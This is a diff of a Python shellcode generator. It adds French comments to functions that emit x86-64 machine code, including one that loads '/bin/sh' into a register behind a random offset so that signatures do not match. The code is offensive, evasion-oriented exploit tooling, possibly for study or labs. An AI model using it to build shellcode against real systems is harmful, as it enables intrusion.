@@ -69,6 +69,7 @@ def pop(register) :
 	if register == 'dl':
 		return '665a'
 
+# Fonction qui génère des instructions pour déplacer une valeur décimale dans un registre
 def mov_register_decimal(register, value):
 	reg = ""
 	methode = random.randint(1, 2)
@@ -86,23 +87,22 @@ def mov_register_decimal(register, value):
 		reg += value
 	return reg 
 	
-def bin_bash() :
+def bin_bash():
 	code = ""
 	rand = str(random.randint(10, 255))
-	bash = '0x68732f6e69622f2f'
-	#print (hex(int(rand))[2:])
+	# Converti cette chaîne en un entier hexadécimal, puis ajouter le nombre aléatoire généré précédemment
+	bash = '0x68732f6e69622f2f' # '/bin/sh' en ASCII hexadécimal
 	tmp = int(bash, 16) + int(rand)
+	# Convertir le résultat en little-endian
 	little_endian = hex(int.from_bytes(bytes.fromhex(hex(tmp)[2:]), byteorder='little'))
-	#print(little_endian)
-	code += '48bb'
-	code += little_endian[2:]
-	#print(hex(tmp)[2:])
-	code += '4d31e4' #xor r12, r12
+	code += '48bb' # mov rbx, immediate
+	code += little_endian[2:] 
+	code += '4d31e4' # xor r12, r12
 	code += '41b4' # mov, r12b
-	code += hex(int(rand))[2:]
-	code += '4c29e3' #sub rbx, r12
+	code += hex(int(rand))[2:] # La valeur du registre r12b
+	code += '4c29e3' # sub rbx, r12
 	return code
-	
+		
 
 def shellcodize(s):
     shellcode = 'X'
